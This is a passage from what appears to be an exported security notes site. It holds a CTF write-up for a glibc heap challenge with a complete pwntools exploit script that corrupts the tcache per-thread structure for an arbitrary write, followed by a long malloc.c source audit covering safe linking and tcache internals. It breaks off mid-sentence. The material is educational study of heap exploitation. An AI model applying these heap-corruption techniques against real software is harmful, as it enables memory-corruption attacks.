internally.\n\nOBSERVATIONS THAT COULD HELP US &gt;&gt;\n\nTcache pointers dont get nulled out when the chunk is returned to the user\nWhen one tcache chunk is added onto the list it does an ENCRYPT_PTR of the current top of tcache and adds it to the list\nWithin the tcache_perthread struct the ptrs are saved as normal pointers.\nDuring allocation from tcache the head of the tcache list is placed after doing REVEAL_PTR on the pointer.\nThe tcache perthread struct is present within the heap itself\n\nCORRUPTING THE TCACHE PER-THREAD-STRUCTURE\nThe following idea is similar to that of HOUSE OF IO which I discovered afterwards.\nIf we construct a 0x290 chunk and make the tcache fd pointer to zero, the tcache struct itself would get linked onto tcache freelist. Which would be very useful for any other exploit strategy as we would end up corrupting the whole tcache, similar to forging a whole arena which controls allocations. But here we are lacking functions that could leak values which thus results in this strategy being almost useless as we dont know what addresses to write. But since we have an offset control we can corrupt the pointers here instead to cause the tcache to redirect the chunk to the 0x21 chunk. But from there it is hard to see the future as the pointer is not encrypted, The REVEAL_PTR function will just segfault as it tries to access invalid memory.\nThis strategy only requires the following &gt;&gt;\n\nBeing able to allocate a chunk of size 0x290\nGetting a UAF in tcache to wipe of the tcache key and null out the pointer\n\nWe have both of these conditions so the first step is taken care of, but how do we encrypt the pointer that we don’t know the address of or do we have to encrypt it in the first place ?\nCURRENT EXPLOIT STRATEGY &gt;&gt;\n\nallocate an 0x290 tcache chunk.\nUsing overlapping chunks / some other primitive wipe out the tcache cookie and null out the tcache pointer.\nAllocate another 0x290 chunk, this would occupy the tcache_perthread_structure.\nmodify addresses placed in the structure through partial overwrites and repeatedly freeing the addresses and changing offsets\nMake one of the addresses point to the 0x21 chunk which will then be occupied while its pointer gets DECRYPTED and ends up in the tcache perthread structure\nMake another tcache struct address point to a fake location which is occupied by the pointer which was present in the 0x21 chunk, Allocate a chunk of that size but dont write anything this time.\nThis would result in the unmangled version of the pointer ending up in one of the tcache struct entries.\nAllocate a chunk of that size and write the value 0x37C37F\nMuney\n\nOne challenge we are going to face is the lack of coalescing tcache has which in turn means if we want to get overlapping chunks we must fill tcache\nANOTHER WAY TO CORRUPT A TCACHE PTR ⇒\nCorrupt small bin through a partial overwrite after which it directly corrupts tcache if you try making it fill up correctly. The smallbin pointers are not mangled thus causing us to be able to write to its bytes with a chance of 1/16 success.\nNEW METHOD &gt;&gt;\nWhen corrupting smallbins you can place an intermediate ptr just before a chunk which malloc would not check if you have a UAF on a smallbin\nNORMALLY &gt;&gt;\n[BK][BIN][FD]-&gt;&gt;-[BK][C1][FD]-&gt;&gt;-[BK][C2][FD]-|\n  |___________________&lt;&lt;______________________|\n\nThis would be the normal linked list in which we corrupt the bk of the second chunk\n[BK][BIN][FD]-&gt;&gt;-[BK][C1][FD]-&gt;&gt;-[BK][FAKE][FD]--&gt;&gt;--[BK][C2][FD]-|\n  |___________________&lt;&lt;_________________&lt;&lt;_______________________|\n\nUnlike normal chunks the only restriction for this chunk is that it should point back to the c1 chunk.\nThis would mean that the fake chunk ends up in tcache during tcache small-bin stashing even if it doesnt meet normal chunk criterias. Giving us an arbitrary write given right conditions. This also does not corrupt the smallbin as a bonus thus making it possible to get an allocation through tcache as the bk pointer will be fixed. \nThis can also be used to write an abritrarily large value somewhere in memory.\nI would have to see into it more but I do assume it should work.\n\nSo using the following method you can corrupt the tcache perthread struct which then allows you to edit the pointers in the structure thus giving you almost complete control over heap allocations.\nSTRATEGY TO CORRUPT THE TCACHE PERTHREAD STRUCTURE -\n\nGain first allocation on the struct\n\nplace pointer to make bk of smallbin point back to valid smallbin chunk\nGet an intermediate smallbin chunk to point to the pointer at the struct\nPull of the tcache diversion attack\nGet an allocation in the struct by allocating two more chunks\n\n\n\nAfter this you can pull of the previous strategy we discussed to get a tcache chunk to point to the mmapped location and an allocation of that bin size will lead you to get the chunk and the allocation in the region where you can write the value to get the flag.\nfrom pwn import *\n \nexe = &#039;./Tamagoyaki_patched&#039;\n \n(host,port_num) = (&quot;localhost&quot;,1337)\n \ndef start(argv=[], *a, **kw):\n    if args.GDB:\n        return gdb.debug(\n            [exe] + argv, gdbscript=gscpt, *a, **kw)\n    elif args.RE:\n        return remote(host,port_num)\n    else:\n        return process( \n            [exe] + argv, *a, **kw)\n    \ngscpt = (\n    &#039;&#039;&#039;\nb * main\n&#039;&#039;&#039;\n).format(**locals())\n \ncontext.update(arch=&#039;amd64&#039;)\n \n# SHORTHANDS FOR FNCS\nse  = lambda nbytes     : p.send(nbytes)\nsl  = lambda nbytes     : p.sendline(nbytes)\nsa  = lambda msg,nbytes : p.sendafter(msg,nbytes)\nsla = lambda msg,nbytes : p.sendlineafter(msg,nbytes)\nrv  = lambda nbytes     : p.recv(nbytes)\nrvu = lambda msg        : p.recvuntil(msg)\nrvl = lambda            : p.recvline()\n \ndef w(*args):\n    print(f&quot;〔\\033[1;32m&gt;\\033[0m〕&quot;,end=&quot;&quot;)\n    for i in args:\n        print(hex(i)) if(type(i) == int) else print(i,end=&quot; &quot;)\n    print(&quot;&quot;)\n \ncontext.log_level = \\\n    &#039;DEBUG&#039;\n \n# _____________________________________________________ #\n# &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; EXPLOIT STARTS HERE &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; #\n \nfreed = []\ndictt = {}\nindex = 0x0\n \ndef malloc(size,data,name,offset=0):\n    global index\n    sla(b&quot;&gt; &quot;,b&quot;1&quot;)\n    sla(b&quot;size: &quot;,str(size).encode())\n    sla(b&quot;offset: &quot;,str(offset).encode())\n    sa(b&quot;buffer: &quot;,data)\n    dictt[name] = index\n    index += 1\n \ndef free(name):\n    sla(b&quot;&gt; &quot;,b&quot;2&quot;)\n    sla(b&quot;idx: &quot;,str(dictt[name]).encode())\n \ndef gimme_dinner():\n    sla(b&quot;&gt; &quot;,b&quot;3&quot;)\n \ncontext.aslr = False\n \np = start()\n \n# WE CAN ALLOCATE A TOTAL OF 128 CHUNKS\n \n# IDK COULD BE USEFUL\nmalloc(0x18,b&quot;S1&quot;,&quot;v1&quot;)\n \n# FILLING UP AN 0X70 TCACHE AND THEN PLACING POINTERS \n# AT PLACES USING FASTBINS\nfor i in range (9):\n    malloc(0x70,b&quot;sugu&quot;,f&quot;s{i}&quot;)\n \nfor i in range (9):\n    free(f&quot;s{i}&quot;)\n \n# CAUSING A MALLOC CONSOLIDATE CALL TO COALESCE FASTBINS\nfake_chnk = p64(0x0) + p64(0x291) + 0x288*b&quot;a&quot; + p64(0x191)\nmalloc(0x490,fake_chnk,&quot;c1&quot;,offset=0x70)\n \n# FILLING UP TCACHE CHUNKS OF SIZE-RANGE\nfor i in range (8):\n    malloc(0x288,b&quot;sugu&quot;,f&quot;tfill{i}&quot;)\n \nmalloc(0x18,b&quot;FENCEPOST&quot;,f&quot;post1&quot;)\n \n# FILL UP THE TCACHE FOR THE SIZE 0X291\nfor i in range (7):\n    free(f&quot;tfill{i}&quot;)\n \n# CURRENT GOAL IS TO PLACE A POINTER IN TCACHE_PER_THREAD STRUCTURE\n# PLACING PTRS USING MALLOC CONSOLIDATE\nfor i in range (9):\n    malloc(0x70,b&quot;sugu&quot;,f&quot;r{i}&quot;)\n \nfor i in range (9):\n    free(f&quot;r{i}&quot;)\n \n# CRAFTING THE CHUNK TO PUT A TCACHE CHUNK PTR\nfake_chnk = p64(0x0) + p64(0x551) + 0x548*b&quot;a&quot; + p64(0x61)\nmalloc(0x600,fake_chnk,&quot;POP&quot;,offset=0x70)\n \nmalloc(0x18,b&quot;FENCEPOST&quot;,&quot;post2&quot;)\nmalloc(0x420,b&quot;CLAYCHUNK&quot;,&quot;SF1&quot;)\nmalloc(0x18,b&quot;FENCEPOST&quot;,&quot;post3&quot;)\n \n# FREEING FAKE CHUNK\nfree(&quot;SF1&quot;)\nmalloc(0x1b0,&quot;TEMPCHUNK&quot;,&quot;tmp1&quot;)\n \nfree(&quot;r8&quot;)\nmalloc(0x2d8,&quot;TEMPCHUNK&quot;,&quot;tmp1&quot;)\n \n# SHUFFLING UNSORTED BIN\nmalloc(0x500,b&quot;SHUFFLE&quot;,&quot;shuf&quot;)\nfree(&quot;shuf&quot;)\n \n# PUTTING THE TCACHE PTR IN PLACE BY ALLOCATING TO SMALLBIN\n# AND USING THE SMALLBIN STASHING PROCEDURE\nmalloc(0x268,&quot;OCCUPY&quot;,&quot;t280&quot;)\n \nfree(&quot;POP&quot;)\nfake_chnk = p64(0x0) + p64(0x581) + 0x578*b&quot;a&quot; + p64(0x31)\nmalloc(0x600,fake_chnk,&quot;POP2&quot;,offset=0x70)\n \nfree(&quot;tfill7&quot;)\n \nfree(&quot;s8&quot;)\n \nfree(&quot;r8&quot;)\nmalloc(0x2e8,&quot;TEMPCHUNK&quot;,&quot;tmp2&quot;)\n \n# SHUFFLING UNSORTED BIN\nmalloc(0x500,b&quot;SHUFFLE&quot;,&quot;shuf2&quot;)\nfree(&quot;shuf2&quot;)\n \n# USING TCACHE ALLOCATIONS\nfor i in range (7):\n    malloc(0x288,&quot;FILLER&quot;,f&quot;W{i}&quot;)\n \n# DOING A SMALLBIN STASH BY REQUESTING SMALLBIN SIZE\nfree(&quot;c1&quot;)\nfake_chnk = b&quot;\\xa0\\xa1&quot;\nmalloc(0x490,fake_chnk,&quot;c1.1&quot;,offset=0x88)\n \nmalloc(0x288,&quot;CHUNK1&quot;,&quot;CH0&quot;)\nmalloc(0x288,&quot;CHUNK2&quot;,&quot;P2&quot;)\n \n# WRITING A SIZE FIELD TO GET A PERSISTENT ALLOCATION IN THE CHUNK\npayload = p64(0x1a1)\nmalloc(0x288,payload,&quot;Q1&quot;,offset=0x28)\n \nmalloc(0x288,&quot;CHUNK3&quot;,&quot;CH1&quot;)\n \n# GOING HAM ALL OVER AGAIN\nfor i in range (7):\n    free(f&quot;W{i}&quot;)\n \n# CORRUPTING TCACHE 0X2d0 TO SET POINTERS\nfree(&quot;POP2&quot;)\nfake_chnk = p64(0x0) + p64(0x581) + 0x578*b&quot;a&quot; + p64(0x41)\nmalloc(0x600,fake_chnk,&quot;POP3&quot;,offset=0x70)\n \nfree(&quot;r8&quot;)\nmalloc(0x2a1,&quot;SOMETHING&quot;,&quot;tmp2&quot;)\n \nmalloc(0x2c8,&quot;LOWPTR&quot;,&quot;LOWPTR&quot;)\n \nfree(&quot;LOWPTR&quot;)\n \nfree(&quot;POP3&quot;)\nfake_chnk = p64(0x0) + p64(0x581) + 0x578*b&quot;a&quot; + p64(0x31)\nmalloc(0x600,fake_chnk,&quot;POP4&quot;,offset=0x70)\n \nfree(&quot;r8&quot;)\n \nmalloc(0x2b8,&quot;TEMPCHUNK&quot;,&quot;tmp2&quot;)\nmalloc(0x2b8,&quot;REQUIREDPTR&quot;,&quot;CH2&quot;)\n \nfree(&quot;POP4&quot;)\nfake_chnk = p64(0x291) + 0x288*b&quot;a&quot; + p64(0x41)\nmalloc(0x600,fake_chnk,&quot;POP5&quot;,offset=0x338)\n \nfree(&quot;CH0&quot;)\nfree(&quot;CH1&quot;)\nfree(&quot;CH2&quot;)\n \n# SHUFFLING UNSORTED BIN\nmalloc(0x500,b&quot;SHUFFLE&quot;,&quot;shuf3&quot;)\nfree(&quot;shuf3&quot;)\n \nfree(&quot;c1&quot;)\nfake_chnk = b&quot;\\xd0\\xa1&quot;\nmalloc(0x490,fake_chnk,&quot;c1.1&quot;,offset=0x88)\n \n# USING TCACHE ALLOCATIONS\nfor i in range (7):\n    malloc(0x288,&quot;FIRSTALLOC&quot;,f&quot;W{i}&quot;)\n \nmalloc(0x288,&quot;FINALE1&quot;,&quot;F1&quot;)\nmalloc(0x288,&quot;FINALE1&quot;,&quot;F1&quot;)\n \npayload = p64(0x2f0)\nmalloc(0x288,payload,&quot;W&quot;,offset=0xb8)\nmalloc(0x2f0,&quot;WIN2&quot;,&quot;L&quot;)\nfree(&quot;L&quot;)\nmalloc(0x310,&quot;WIN2&quot;,&quot;L&quot;)\nmalloc(0x310,&quot;WIN2&quot;,&quot;L0&quot;)\nfree(&quot;L&quot;)\nfree(&quot;L0&quot;)\n \nfree(&quot;W&quot;)\npayload = b&quot;\\xa0\\xa2&quot;\nmalloc(0x198,payload,&quot;W.0&quot;,offset=0x20)\n \nmalloc(0x2f0,&quot;WIN3&quot;,&quot;L&quot;)\n \nfree(&quot;W.0&quot;)\npayload = b&quot;\\x00\\xa2&quot;\nmalloc(0x198,payload,&quot;W.1&quot;,offset=0x30)\n \npayload = p64(0x37c3c7f)\nmalloc(0x310,&quot;FINAL&quot;,&quot;W&quot;,offset=0x0)\nmalloc(0x310,payload,&quot;W&quot;,offset=0x0)\n \ngimme_dinner()\n \np.interactive()"},"KERNEL-EXPLOITATION":{"title":"KERNEL EXPLOITATION","links":[],"tags":["kernel-exploitation"],"content":"This is where I would update my Kernel exploitation notes after I am through some of it."},"LEARNING-NOTES/HEAP-EXPLOITATION":{"title":"HEAP EXPLOITATION","links":["LEARNING-NOTES/MALLOC-SRC-CODE-AUDIT","UNSAFE-UNLINK"],"tags":["blog","heap-exploitation","learning"],"content":"These are my heap exploitation notes :)\nPREVIOUS  &gt;&gt; MALLOC SRC CODE AUDIT\nNEXT          &gt;&gt;  UNSAFE-UNLINK\nThis is the beginning of my documentation of the heap exploitation challenges I will solve and techniques that I will learn. I shall update the following once I sort through them.\nUntil then\nR0R1"},"LEARNING-NOTES/MALLOC-SRC-CODE-AUDIT":{"title":"MALLOC SRC CODE AUDIT","links":["MALLOC-LABS"],"tags":["blog","heap-exploitation","learning"],"content":"PREVIOUS &gt;&gt; MALLOC LABS\nTHIS IS A SOURCE CODE AUDIT OF MALLOC.C FROM  [GLIBC 3.8.9000]\n\nI did the following audit a while back in october last year\nI am putting out the following as I had went through glibc source code to learn heap exploitation\nHopefuly it is of use even though the newer glibc just dropped\n\nALLOCATION SIZES AND METHODS —\n\nrequests of sizes --&gt;\n- &gt;=  512 bytes - best-fit allocation FIFO \n- &lt;=   64 bytes - first fit caching LIFO?\n- &gt;= 128K bytes - system memory mapping facilities --mmap\n\nALIGNMENT - 2 * sizeof(size_t)\n\tEven a request for zero bytes (i.e., malloc(0)) returns a\n\tpointer to something of the minimum allocatable size.\n\nwastage is less than or equal to minsize usually but during mmap, allocation made is in the order of two pages.\n\nValues that appear to be negative after overhead and alignment are supported by only mmap. On failure of the following returns NULL.\n\nMALLOC_DEBUG DMALLOC_DEBUG and stuff can be used to run malloc while it checks across the size fields of the following.\n\nTCACHE_MAX_BINS     -     64\nTCACHE_FILL_COUNT   - no of chunks held by a bin - usually 7 max - 65535 UINT16\nidx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)\nidx 1   bytes 25..40 or 13..20\nidx 2   bytes 41..56 or 21..28\n...\n\nREALLOC_ZERO_BYTES_FREES - controls if realloc(0) calls free [1 - default]\nTRIM_FASTBINS            - controls if to trim fastbins for reducing memory footprint and avoiding usage of system level emmory [0 - default] \n\nM_MXFAST - Fastbin sizes range from 0 to 80 where 0 would disable it resulting in best-fit for all cases. set by the macro [64 - default]\nM_TRIM_THRESHOLD - [32*0x1000] can be set to -1 to disable it. Chooses when to trim the heap by checking this value.\nM_TOP_PAD        - [0] amount of padding/free space to retain while giving a call to sbrk\nM_MMAP_THRESHOLD - [32*0x1000] has MIN AND MAX VALUES MIN HAS FOLLOWING WHILE MAX HAS 128 * 0X1000\nM_MMAP_MAX       - 65536\n\n\nLIBC FUNCTIONS FOR MEMORY MANAGEMENT :\n[__libc_malloc]  (size_t)         - allocating memory\n[__libc_free  ]  (void *)         - freeing up memory once used\n[__libc_calloc]  (size_t,size_t)  - allocating and 0-ing memory\n[__libc_realloc] (void *,size_t)  - reallocating memory\n[__libc_memalign](size_t,size_t)  - aligning memory to size_t\n[__libc_valloc]  (size_t)         - system mem allocation\n[__libc_mallocinfo]               - gets info related to malloc\n[__libc_pvalloc] (size_t)         - allocate sys-mem pagealigned\n[__malloc_trim]  (size_t)         - gives mem back to system\n \nMORECORE\n\nUsed to obtain memory from the OS through sbrk\n\nMORECORE            - type usually sbrk\nMORECORE_FAILURE    - defines if morecore failed\nMORECORE_CONTIGUOUS - defines if allocation is contiguous\nMORECORE_CLEARS     - defines 0ing out of memory\nHAVE_MREMAP         - allows the remapping of blocks\n\nSTRUCTURE OF CHUNK:\nmalloc chunk{\nsize_t prev_size\nsize_t chunk_size\n \n// used when only free -- all blocks\nchunk * fd;    \nchunk * bk;\n \n// used in only large blocks and if free\nchunk * fd_nextsize \nchunk * bk_nextsize\n}\nEXCEPTIONS TO THE MALLOC CHUNK RULES --\n- Top chunk does not use the trailing size field as it does not have any data beyond it\n- If the mmapped bit is set then the other bits are ignored as the mmapped memory do not belong in an arena or are never adjacent to a freed chunk\n- Fastbin chunks are consolidated only in bulk in malloc_consolidate else they are considered as allocated\n\nMEMORY TAGGING\nThe malloc functions which has a prefix __int_ to it are used to deal with untagged memory.\nIMPORTANT STRUCTURES THAT MANAGE MEMORY\nBINS :\nBins is the version of a segregated linked list in malloc which is in size-ordered fashion. There are in total 128 bins whose inner sizes are logarithmically spaced. Bins work in a FIFO approach.\nThe following is the way the bins are split\n64 bins of size        8\n32 bins of size        64\n16 bins of size       512\n 8 bins of size      4096\n 4 bins of size     32768\n 2 bins of size    262144\n 1 bin  of size  what&#039;s left\n\nUNSORTED BINS :\nUnsorted chunks are stored at the bin 1 which is usually un-indexable. It acts like a queue where chunks are placed on it due to free and malloc_consolidate and taken off during calls to malloc i.e placed in proper bins or to be used. NON_MAIN_ARENA flag is never set in these chunks.\nTOP CHUNK:\nTop chunk is the top most available chunk which is never included in any bin and is only used if no other chunk is available. Memory here can be released back to the system if above M_TRIM_THRESHOLD. Top points to its own bin with initial size as 0. This is to avoid any special case checking for the top chunk every time any function is being called. The following also helps top to treat the bin as legal but unusable during the time between initialisation and first call to sysmalloc. During first call initial_top is defined as one of the unsorted_chunks.\nBINMAP:\nBinmap is a one-level index structure [a bit vector] used for bin-by-bin searching. It records if the bins are not empty so that they can be skipped during traversals. The bits are marked only when they are noticed during malloc traversal.\nFASTBINS:\nSegregated free list holding recently freed small chunks\n\nworks on LIFO\nSingly linked lists\nOrdering doesnt matter\nInuse bit is set and thus only consolidates during malloc_consolidate\n\ndefault MAX_FAST_SIZE 180/0XA0 BYTES\nFASTBIN_CONSOLIDATION_THRESHOLD 65535 - size of a chunk in free that triggers auto-consolidation of nearby fastbin chunks. \nNON_CONTIGOUS_BIT used when MORECORE returns memory which are not contigous regions. The initial value is false as MORECORE_CONTIGOUS is set to true.\nhave_fastchunks indicate the presence of fastbin chunks, set to NULL during calls to malloc_consolidate().\n\nmax_fast can be changed which can even be set to very small values for disabling fastbins. The max memory handled in fastbins is defined by this global variable.\nPrecondition: there is no existing fastbin chunks in the main arena.\nSince do_check_malloc_state () checks this, it calls malloc_consolidate () before changing max_fast.  Note other arenas will leak their fast bin\nentries if max_fast is reduced.\nIMPORTANT BITS:\nPREV_INUSE  - LOWEST BIT INDICATES IF PREVIOUS IS FREE OR IN USE\nIS_MMAPPED  - SECOND LOWEST &gt; FOR CHECKING IF BLOCK WAS MMAPPED\nNON_MAIN_AR - THIRD LOWEST UNUSED WHEN NO NEW THREADS ARE THERE\n\nOTHER STRUCTURES USED:\n\n\nmalloc_state\n\n\nMalloced states are placed in mmapped areas which are part of arenas. It has the state of malloc and dynamic memory allocations within the current arena.\nmstates are operated on by the following functions:\nstatic void *sysmalloc (INTERNAL_SIZE_T,mstate);\nstatic int   systrim (size_t,mstate);\nstatic void malloc_consolidate (mstate);\nstatic void tcache_thread_shutdown (void);\n\n\nmalloc_par\n\n\nThis is used for storing important parameters such as trim_threshold, top_pad, mmap_threshold, arena_test, arena_max etc.  Keeping track of mmapped memory and number of mmaps. sbrk_base. If tcache is enabled then the following parameters are specified within, no of tcache bins, no of chunks in each bucket, number of chunks to remove from bucket.\nMITIGATIONS :-\n\n\n\n\nSAFE LINKING\nTo protect the single-linked list of Fast-Bins and T-Cache and double linked list of Small-Bins from getting pointer hijacked, Masking is done to the “next” pointers of the lists in the chunks using the randomness from ASLR/(mmap_base). In short a simple xor with the upper bytes of the memory page the current requested chunk lies in i.e\n[pointer ^ ptr &gt;&gt; 12]\ndemasking code —\n\n\n\n\nworks when the pointer points to the memory lying within the same page\n\n\thex((encoded ^ (encoded &gt;&gt; 12) ^ (encoded &gt;&gt; 24)) ^ (encoded &gt;&gt; 36))\n\n\n\nMEMORY TAGGING\nThe pointers alongside the blocks are coloured and they are recoloured when they are freed and given back. This is used to detect buffer overflows and use-after-frees. This has a performance impact but the old ptr’s are ensured to not be used due to this. usually DISABLED. But can be enabled in systems such as ARM.\n\n\n\n\nDOUBLE FREE DETECTION\nThe tcache entry has a key field in the backward pointer to detect double frees. The backward pointer is set to this specific key value which then prevents it from being overwrittten and freed again.\n\n\n\nDEBUG-MODE MALLOC FUNCTIONS:\ndo_check_chunk (mstate av,mchunkptr p)\n\nChecks if the chunk is in a valid address if it is contigous\nChecks if top size is at least MINSIZE\nChecks if top predecessor is always marked inuse\nChecks if top size is always greater than MINSIZE\nIF MMAPPED\nchecks if chunk is page aligned\nchecks if chunk is mem aligned\n\ndo_check_free_chunk (mstate av, mchunkptr p)\n\nCalls do_check_chunk()\nChecks if chunk is free and chunk is not mmapped\nChecks if chunk remains coalesced if any\nChecks if it has proper links\n\ndo_check_inuse_chunk (mstate av, mchunkptr p)\n\nCalls do_check_chunk()\nChecks if chunk is mmapped if yes it returns\nelse it checks if the chunk claims to be inuse\nchecks if next chunk claims to be prev inuse if not it checks for a free chunk by calling do_check_free_chunk()\nChecks topchunk by calling do_check_free_chunk on top\n\ndo_check_remalloced_chunk (mstate av, mchunkptr p,INTERNAL_SIZE_T s)\n\nChecks if chunk is mmapped if not checks if arena is same as obtained\nCalls do_check_inuse_chunk()\nChecks if the size is valid alongside alignment\nChecks if chunk is less than minsize or more than requested size “s”\nAll of these results in a fail\n\ndo_check_malloced_chunk (mstate av, mchunkptr p, INTERNAL_SIZE_T s)\n\nCalls do_check_remalloced_chunk()\nPrev inuse is true for every allocated chunk\n\ndo_check_malloced_state (mstate av)\n\nChecks if INTERNAL_SIZE_T is only as small as pointer type\nChecks if alignment is a power of two\nChecks if the arena is initialised i.e top!=0 if yes it returns\nELSE checks the consistency of the main_arena with the sbrk base\n+\nFASTBIN CHECKS\nCheck if max_fast is only in the allowed range\nChecks if all bins past max_fast are empty\nChecks if all fastbin chunks claim to be inuse and is aligned\nChecks if the chunk belongs to the respective bin\n+\nNORMBIN CHECKS\nChecks if the binmap is correct\nChecks if the chunks in the bin are free\nChecks if chunk belongs in the bin\nChecks if the lists are sorted\nChecks if the chunk lists are proper.\nCheck the top chunk again by calling check_chunk()\nCheck if the induvidual chunks are followed by a chain of inuse chunks\n\nSPECIFIC FUNCTION SUMMARIES\n\nUnlink_chunk -\nUnlinks a chunk from the bin list.\nlist of checks —\n\nchecks if the prev_size of next chunk is same as the chunksize else returns corrupted size vs. prev size\nchecks if the forward pointer of the previous is same as the backward pointer of the next field, else marks corrupted double-linked list.\nChecks if the pointer is small by checking fd_nextsize and bk_nextsize\n\nget_max_fast() -\nchecks if the global variable max_fast is greater than MAX_FAST_SIZE macro and if yes it calls an error else it returns global_max_fast. This is to prevent out of bound memory access in an array form.\nSYSTEM ALLOCATION ROUTINES:\n\nSysmalloc_mmap (INTERNAL_SIZE_T nb,size_t pagesize,int extra_flags,mstate av)\nCalls mmap on behalf of malloc with the specified size nb and flags\nreturns if the call to mmap fails and assumes av→top doesnt have enough space to service the request.\nlist of checks —\n\nChecks if the mmap size value wraps around zero, if yes the call fails\nOther things it does —\nIf flags are lacking for a very large allocation advises kernel using madvice() which calls madvise() with advise as HUGE_PAGE\nCalls mmap and sets the header and footer with the aligned size field always aligns it despite no chances of page-aligned memory not being aligned.\nUpdates n_mmaps and max_mmapped_memoryCalls check_chunk()\nreturns pointer to mmapped memory\n\nSysmalloc_mmap_fallback (long int *s,INTERNAL_SIZE_T nb, INTERNAL_SIZE_T old_size,size_t minsize, size_t pagesize, int extra_flags,mstate av)\nUsed as a fallback if MORECORE fails to provide enough memory.\nlist of checks —\n\nChecks if the mmap size value wraps around zero, if yes the call fails\nOther things that this does —\nSets as noncontigous in the arena so as to mark the region as not part of the original heap so as to not rely on regions being contigous\n\nsysmalloc (INTERNAL_SIZE_T nb ,mstate av)\nThe call has a precondition that it is only called if the top has lesser space than what is required.\nlist of checks —\n\nChecks if the current top has the prev_inuse set and if its aligned alongside having at least MINSIZE value.\nIt does the following functions —\n\n\nDirect call to mmap if the size meets mmap_threshold and mmap is there and av == NULL, i.e no arena\n\n\nif the mmap call fails then it returns 0 else av is set to the new mmaped region.\n\n\nif av != main_arena this means that memory cant be obtained using sbrk so\n-⇒ Tries to grow current heap by trying to mprotect memory\n-⇒ if failed tries to allocate new heap\n-⇒ if failed calls mmap using sysmalloc_mmap() if tried is not set\n-⇒ if failed returns idk cause if MAP_FAILED it considers av as main arena and goes to the else block. .. wierd maybe it just returns…\nIf av== main_arena Page aligns the size and calls MORECORE which gets memory from OS through sbrk.\n-⇒ if MORECORE fails then sysmalloc_mmap_fallback() is used\n-⇒ if failed sets brk as MAP_FAILED and snd_brk as brk+size\nIf previous routine doesnt fail then extends top and sets head\nIt checks if there was an intervening sbrk call and if there was it calls sbrk with a correction amount which ends at a page boundary. This is what happens when the memory is contigous. If not contigous the sbrk call is made with argument 0 which will help to set up footers and move to another chunk.\nWhen sbrk is checked if a gap is present between the previous sbrk call and top chunk then it sets it as correction and artificial chunks are created around it which are set to always inuse. These are described as fenceposts in the source. When setting up such fenceposts the old top can completely be overwritten due to it, if in case it was of size → MINSIZE. If there is remaining size after setting up the fenceposts it is freed and added to the unsorted bins.\nAfter all of the following is done the function checks if at least one of the following paths succeed setting the size. This returns the pointer p which would be our allocated memory address.\nIf failed it sets the error and returns zero.\n\nSystrim(size_t pad,mstate av)\nIt does the following\n\nIt checks for foreign sbrk calls and returns 0 if a external call was made\nIt page aligns pad and subtracts that amount from the top chunk and also unmaps by calling sbrk with -ve value of the amount.\nIt checks if the released amount is not 0, it returns 1 after adjusting top by subtracting released amount and sets head and calls check_malloc_state()\n\nmunmap_chunk(mchunkptr p)\nThe following is what the function does\n\nIt makes sure the given ptr is a mmapped ptr : bit 2 is set and that the ptr is a multiple of pagesize and 2\nIf yes it unmaps the pointer if it fails the program simply returns claiming nothing much can be done.\n\nmremap_chunk(mchunkptr p, size_t new_size)\ncalls mremap if the newsize versus total size has an increase  or decrease in number of pages. if failed returns 0,\n→ checks alignment\n→ checks prev field on if it is set to true always\n→ sets header with the required offset subtracted from it\n→ returns the pointer p when it succeeds\n\nTCACHE FUNCTIONS :\nTCACHE ENTRY STRUCTURE\n\nstruct tcache_entry {\n\nstruct tcache_entry *next;\n\n// key to prevent double frees\nuintptr_t key;\n\n}\n\nTcache backward pointer will have a specific key value of 64 bits which is placed to denote that the chunk has been freed once. This is used against bugs such as double-frees().\n\nThere is a tcache_perthread_struct which has the number of bins and pointer to the entries and the structure is a global variable within libc\nTcache key that exists are initialised by the tcache_key_initialisefunction\n\n\nThe caller should verify if everything’s good when calling tcache_put\n\n\ntcache_put - sets the key to be the tcache_key - which is a global variable and protects the pointer and puts it in updating the tcache index.\ntcache_get_n -  checks if a chunk is aligned and returns the following chunk after unlinking it from the tcache list, same is with tcache_get but it instead removes from front.\ntcache_next iterates through the list\ntcache_shutdown Shuts down tcache and frees all the lists held by tcaching for coalescing after an alignment check.\ntcache_init - It does not work when tcache_shutting_down variable is set.\n\nLIBC FUNCTIONS MALLOC/FREE\n__libc_malloc(size_t bytes)\nCHECKS MADE -\n\nChecks if the memory returned by __int_malloc() calls are proper\nFunctionality of code -\n\n\nIf __malloc_initialised is set to zero it calls ptmalloc_init() to initialise malloc. Else it proceeds and converts size to accomodate headers and to check if it is zero even after that. If yes it returns error.\nElse it continues with converting the size to a tcache index if tcache is uninitialised or bins are less than index it doesnt use tcache else it gets the chunk from the specified index if the value is greater than 0 by using tcache_get(index)\nIf single threaded it calls __int_malloc() which returns a ptr which is then memory tagged if tagging is enabled else it returns the pointer to the memory returned by __int_malloc()\nElse it tries to get the arena which it belongs to and then calls _int_malloc. if it fails then it retries with another usable arena by calling arena_get_retry() which either creates a new arena or looks for another one.\nIt returns after tagging the memory and asserting that either the returned memory belongs in the same arena as it claims or doesnt exist or is mmaped.\n\n__libc_free(void *mem)\nCHECKS PRESENT —\nFunctionality of the code —\n\nfree (0) just returns\nIf mtags are enabled then it checks the pointer given with the tag applied to it, useful against double-free().\nIt checks if the pointer given to is of an mmapped region separate from the normal malloc routine, checks upper and lower malloc threshold with the size and also checks if dynamic threshold (user defined) is enabled. If yes it updates the threshold to the chunksize and the trim threshold to twice the mmap threshold. After which the chunk is unmapped.\nElse It initialises tcache if not yet initialised, and tags memory if mtags enabled and gets the arena and calls  _int_free()\nIf none of the following occurs it sets error and returns\n\n__libc_realloc(void *oldmem, size_t bytes)\nCHECKS DONE —\n\nrealloc() has a wraparound check for the size field which checks if the value of size could be malicously crafted or misplaced.\nFunctionality of code —\n\n\nIf malloc is not initialised then it calls ptmalloc_init()\n\n\nif size is 0 it frees if the REALLOC_ZERO_BYTE_FREES macro is active else realloc of null gives same results as malloc of null\n\n\nmtag checks are done if mtag is enabled.\n\n\nIf the size requested is fullfilled by the alignment padding then the same pointer is returned as such.\n\n\nIf the chunk is mmapped then it sets arenaptr to NULL else if tcache is not initialised it initializes tcache. and sets ar_ptr to arena_for_chunk. If chunk is mmapped or after headers the size field is 0 it exits.\nIf chunk was mmaped it uses mremap to remap the current chunk and tags the memory again with a different tag. Else if remap 